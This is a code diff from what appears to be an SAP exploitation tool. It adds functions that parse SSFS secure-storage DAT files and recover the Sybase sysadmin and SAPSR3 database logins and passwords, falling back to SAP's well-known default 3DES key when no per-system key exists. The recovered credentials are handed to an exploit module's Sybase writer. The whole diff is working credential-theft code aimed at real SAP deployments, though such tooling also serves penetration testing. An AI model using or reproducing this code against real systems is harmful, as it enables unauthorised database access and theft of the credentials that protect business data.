@@ -192,7 +192,8 @@ def _decrypt_ssfs_key_enc(key_file_bytes: bytes) -> bytes:
 # SSFS DAT file parsing
 # ---------------------------------------------------------------------------
 
-def parse_ssfs_dat(dat_file_bytes: bytes, ssfs_key: bytes = None) -> list:
+def parse_ssfs_dat(dat_file_bytes: bytes, ssfs_key: bytes = None,
+                   with_flags: bool = False) -> list:
     """Parse an SSFS_<SID>.DAT file and return decrypted records.
 
     Record structure (from pysap SAPSSFS.py):
@@ -217,6 +218,13 @@ def parse_ssfs_dat(dat_file_bytes: bytes, ssfs_key: bytes = None) -> list:
     If ssfs_key is provided, each record's data payload is decrypted with it.
     Returns list of (ident, data_hex) tuples where data_hex is the encrypted
     (or decrypted) payload as hex.
+
+    ``with_flags``: when True, returns 3-tuples (ident, data_hex,
+    is_plaintext) so callers can distinguish plaintext records (whose
+    payload is the raw value, no decryption needed) from encrypted ones.
+    Used by :func:`extract_sybase_kernel_creds` and other DB_CONNECT
+    consumers where the username records are stored plaintext but the
+    passwords are encrypted (issue #26 follow-up).
     """
     _REC_PREAMBLE = b"RSecSSFsData"
     _REC_HEADER_LEN = 176
@@ -273,12 +281,192 @@ def parse_ssfs_dat(dat_file_bytes: bytes, ssfs_key: bytes = None) -> list:
                     data_bytes = rsec_decrypt(data_bytes, ssfs_key)
                 except Exception:
                     pass  # leave as encrypted
-            records.append((ident, data_bytes.hex().upper()))
+            if with_flags:
+                records.append((ident, data_bytes.hex().upper(),
+                                bool(is_plaintext)))
+            else:
+                records.append((ident, data_bytes.hex().upper()))
 
         pos += rec_len  # advance to next record
 
     print(f"[*] SSFS DAT: parsed {len(records)} records from {len(dat_file_bytes)} bytes")
     return records
+
+
+# ---------------------------------------------------------------------------
+# SSFS DB_CONNECT credential extraction (issue #26 follow-up)
+#
+# SAP-on-Sybase stores the DB credentials the SAP kernel uses in the same
+# SSFS_<SID>.DAT store, under four well-known idents:
+#
+#   DB_CONNECT/DEFAULT_DB_USER      Plaintext — ABAP schema owner ("SAPSR3")
+#   DB_CONNECT/DEFAULT_DB_PASSWORD  Encrypted — SAPSR3's password
+#   DB_CONNECT/SYB/SADB_USER        Plaintext — Sybase sysadmin login ("sapsa")
+#   DB_CONNECT/SYB/SADB_PASSWORD    Encrypted — that login's password
+#
+# The SYB/SADB_* pair is the actual `<sid>adm` → Sybase SSO — the analogue
+# of hdbuserstore's DEFAULT key for HANA, xuser for MaxDB, and OPS$ for
+# Oracle.  Extracting them lets the GW SAPXPG Sybase writer skip the
+# operator-supplied db_password argument entirely.  Mechanism references:
+#   SAP Note 1643080  (DB connect info for Sybase ASE)
+#   SAP KBA 2584472   (R3trans / DEFAULT_DB_USER credentials in SSFS)
+# ---------------------------------------------------------------------------
+
+# Ident constants — one string, one place.
+_SSFS_SYB_SADB_USER      = "DB_CONNECT/SYB/SADB_USER"
+_SSFS_SYB_SADB_PASSWORD  = "DB_CONNECT/SYB/SADB_PASSWORD"
+_SSFS_DEFAULT_DB_USER    = "DB_CONNECT/DEFAULT_DB_USER"
+_SSFS_DEFAULT_DB_PWD     = "DB_CONNECT/DEFAULT_DB_PASSWORD"
+
+
+def _decode_ssfs_plaintext_value(payload: bytes) -> str:
+    """Decode the raw payload of a plaintext SSFS record into its string value.
+
+    Plaintext SSFS records store the value directly in the payload — no
+    length prefix, no padding metadata; the whole `rec_len - 176` byte
+    slice IS the value.  We strip trailing NUL / space fillers a few
+    tools add and decode as ASCII (SSFS keys and DB user names are pure
+    ASCII by convention).
+    """
+    if not payload:
+        return ""
+    value = payload.rstrip(b"\x00 \t\r\n")
+    return value.decode("ascii", errors="replace")
+
+
+def _decode_ssfs_encrypted_value(payload: bytes) -> str:
+    """Decode a POST-decryption SSFS record payload into its string value.
+
+    Structure verified against decrypted DB_CONNECT/SYB/SADB_PASSWORD from a
+    live NPL 7.5x kernel (issue #26 SSO chain):
+
+        [ 0 ..  7]  8-byte header (session-specific salt-shaped bytes)
+        [ 8 .. 11]  val_len — big-endian uint32
+        [12 .. 31]  20 bytes — HMAC-SHA1 tag over the value
+        [32 .. 32 + val_len]  the actual value (ASCII)
+        [32 + val_len ..]  block padding
+
+    The 20-byte HMAC + 8-byte header prefix is common to every encrypted
+    SSFS value record (RSECTAB entries have a different envelope handled
+    by the existing decrypt_entry chain, so those stay on their own path).
+    """
+    if len(payload) < 12:
+        return ""
+    try:
+        val_len = int.from_bytes(payload[8:12], "big")
+    except Exception:
+        return ""
+    # Sanity: passwords are short (< 256 bytes) and never negative.
+    if val_len <= 0 or val_len > 512:
+        return ""
+    if len(payload) < 32 + val_len:
+        return ""
+    return _decode_ssfs_plaintext_value(payload[32:32 + val_len])
+
+
+def extract_sybase_kernel_creds(dat_file_bytes: bytes,
+                                 ssfs_key: bytes = None) -> dict:
+    """Extract the Sybase / DEFAULT DB credentials the SAP kernel uses.
+
+    Returns a dict:
+        {
+          "sapsa_user":        str  — Sybase sysadmin login,     or "" if absent
+          "sapsa_password":    str  — Sybase sysadmin password,  or "" if not
+                                       decryptable (ssfs_key missing on this
+                                       system)
+          "sapsr3_user":       str  — ABAP schema owner,          or ""
+          "sapsr3_password":   str  — ABAP schema owner password, or ""
+          "encrypted_missing_key": bool — True when password records exist
+                                       but no ssfs_key was available (the
+                                       "no SSFS_<SID>.KEY file on disk" case
+                                       — SAPMAP falls back to no decryption,
+                                       and the caller can react)
+          "source":            str  — free-form provenance string, for the
+                                       finding surfaced to the operator
+        }
+
+    Plaintext user records surface even without ``ssfs_key``.  Encrypted
+    password records need the SSFS master key — if it's absent we still
+    return the users we found so the operator at least knows which login
+    to try, plus ``encrypted_missing_key=True`` for the writer to log.
+    """
+    result = {
+        "sapsa_user":     "",
+        "sapsa_password": "",
+        "sapsr3_user":    "",
+        "sapsr3_password": "",
+        "encrypted_missing_key": False,
+        "source":         "SSFS DB_CONNECT/*",
+    }
+    if not dat_file_bytes:
+        return result
+
+    # On systems with no SSFS_<SID>.KEY file on disk (e.g. the NPL Developer
+    # Edition VM) the SAP kernel falls back to a well-known default 3DES key
+    # — the same DEFAULT_KEY_HEX SAPMAP already carries for RSECTAB entry
+    # decryption.  Verified live: this key does decrypt the SSFS record
+    # envelopes when no per-system key file exists, revealing the sapsa /
+    # SAPSR3 credential values.  So when the caller passed no ssfs_key we
+    # opportunistically try DEFAULT_KEY_HEX before giving up.
+    effective_key = ssfs_key
+    key_source = "individual"
+    if effective_key is None:
+        try:
+            effective_key = bytes.fromhex(DEFAULT_KEY_HEX)
+            key_source = "SAP default (no SSFS_<SID>.KEY on disk)"
+        except Exception:
+            effective_key = None
+
+    records = parse_ssfs_dat(dat_file_bytes, ssfs_key=effective_key,
+                              with_flags=True)
+
+    def _lookup(target_ident: str):
+        for ident, data_hex, is_plaintext in records:
+            if ident == target_ident:
+                return bytes.fromhex(data_hex), is_plaintext
+        return None, None
+
+    for ident, key in (
+            (_SSFS_SYB_SADB_USER,     "sapsa_user"),
+            (_SSFS_DEFAULT_DB_USER,   "sapsr3_user"),
+    ):
+        payload, is_plain = _lookup(ident)
+        if payload is not None and is_plain:
+            result[key] = _decode_ssfs_plaintext_value(payload)
+
+    any_encrypted_seen = False
+    any_encrypted_decoded = False
+    for ident, key in (
+            (_SSFS_SYB_SADB_PASSWORD,  "sapsa_password"),
+            (_SSFS_DEFAULT_DB_PWD,     "sapsr3_password"),
+    ):
+        payload, is_plain = _lookup(ident)
+        if payload is None:
+            continue
+        if is_plain:
+            # Extraordinarily rare, but honour the flag.
+            result[key] = _decode_ssfs_plaintext_value(payload)
+            continue
+        any_encrypted_seen = True
+        # Encrypted: parse_ssfs_dat has already run RSECCipher on the payload
+        # with `effective_key` (individual or default); now peel off the
+        # 8-byte header + 4-byte val_len + 20-byte HMAC prefix to get the
+        # actual value.
+        if effective_key is not None:
+            decoded = _decode_ssfs_encrypted_value(payload)
+            if decoded:
+                result[key] = decoded
+                any_encrypted_decoded = True
+
+    if any_encrypted_seen and not any_encrypted_decoded and ssfs_key is None:
+        # Default-key fallback didn't get us a readable value — flag the
+        # caller so it can log clearly and suggest supplying the per-system
+        # SSFS master key.
+        result["encrypted_missing_key"] = True
+    elif any_encrypted_decoded and key_source != "individual":
+        result["source"] = f"SSFS DB_CONNECT/* ({key_source})"
+
+    return result
 
 
 # ---------------------------------------------------------------------------
@@ -1219,6 +1407,35 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
                     break
         except Exception as e:
             print(f"[-] SecStore {node.sid}: SSFS DAT parse error: {format_rfc_exception(e)}")
+
+    # DB_CONNECT extraction (issue #26 follow-up) — populate the Sybase
+    # writer's SSO input from the same SSFS DAT we already read.  Runs
+    # regardless of ssfs_key: the *_USER records are plaintext and surface
+    # without a key; the *_PASSWORD records need the key and are skipped
+    # cleanly when it is absent (encrypted_missing_key=True in the result).
+    # Only worth doing when the node is (or might be) Sybase, but the
+    # extraction is cheap so we always run it — the records simply don't
+    # exist on non-Sybase kernels.
+    if dat_bytes:
+        try:
+            db_creds = extract_sybase_kernel_creds(dat_bytes, ssfs_key)
+            if db_creds.get("sapsa_user") or db_creds.get("sapsr3_user"):
+                # Persist onto the node so the Sybase writer caller in
+                # sapmap_exploit.py can pick it up.  A plain dict field
+                # keeps the model surface minimal — no new dataclass.
+                node.db_kernel_credentials = db_creds
+                _u = db_creds.get("sapsa_user") or "?"
+                _pw_state = ("password recovered"
+                             if db_creds.get("sapsa_password")
+                             else ("password encrypted (SSFS key not "
+                                   "available on this system)"
+                                   if db_creds.get("encrypted_missing_key")
+                                   else "no password in SSFS"))
+                print(f"[+] SecStore {node.sid}: SSFS DB_CONNECT → "
+                      f"Sybase kernel login user={_u}, {_pw_state}")
+        except Exception as e:
+            print(f"[-] SecStore {node.sid}: SSFS DB_CONNECT extraction "
+                  f"failed: {format_rfc_exception(e)}")
 
     # --- Method 3: Read RSECTAB via RFC_ABAP_INSTALL_AND_RUN ---
     print(f"[*] SecStore {node.sid}: [Method 3] reading RSECTAB entries via "
